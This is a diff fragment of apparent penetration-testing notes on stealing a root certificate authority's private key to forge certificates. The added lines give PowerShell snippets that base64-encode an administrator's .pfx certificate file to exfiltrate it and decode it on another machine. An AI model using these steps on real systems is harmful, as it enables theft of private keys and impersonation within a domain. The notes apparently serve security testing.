@@ -8,6 +8,20 @@ Steal the private key of the root CA's certificate to generate our own certifica
 
 The private key of the CA is stored on the CA server, if not protoect through Hardware Security Module (HSM) - a hardware-based protection method - it is protected by the machine Data Protection API (DPAPI).
 
+Way to exfiltrate the certificates with PowerShell
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("/users/administrator/LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx"))
+```
+Way to infiltrate a certificate with PowerShell
+```powershell
+$base64String = "<INSERT Base64 ENCODED PFX>"
+# Convert the Base64 string back to bytes
+$bytes = [System.Convert]::FromBase64String($base64String)
+
+# Save the bytes to a file
+Set-Content -Path "<YOUR PATH>\file.pfx" -Value $bytes -Encoding Byte
+```
+
 ```powershell
 # View CA Certificate on the DC 
 # Some Certificate do not allow exporting the private key  
